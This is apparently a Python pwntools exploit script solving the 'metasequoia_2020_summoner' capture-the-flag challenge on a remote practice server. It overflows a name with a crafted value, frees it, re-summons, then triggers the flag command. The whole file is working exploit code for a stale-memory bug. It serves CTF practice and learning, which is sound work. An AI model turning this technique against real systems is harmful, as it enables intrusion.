from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('metasequoia_2020_summoner')
io = remote('node4.buuoj.cn', 28607)
# libc = ELF('/mnt/hgfs/payoung/Documents/ctf/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
# libc = ELF('libc-2.23.so')
elf = ELF('metasequoia_2020_summoner')


def add(name):
    io.sendlineafter('Enter your command:\n> ', b'summon ' + name)


def delete():
    io.sendlineafter('Enter your command:\n> ', 'release ')


def get_flag():
    io.sendlineafter('Enter your command:\n> ', 'strike ')


def pwn():
    add(b'a' * 8 + p64(5))
    delete()
    add(b'a')
    get_flag()
    io.recv()
    # gdb.attach(io)
    # pause()


if __name__ == '__main__':
    pwn()
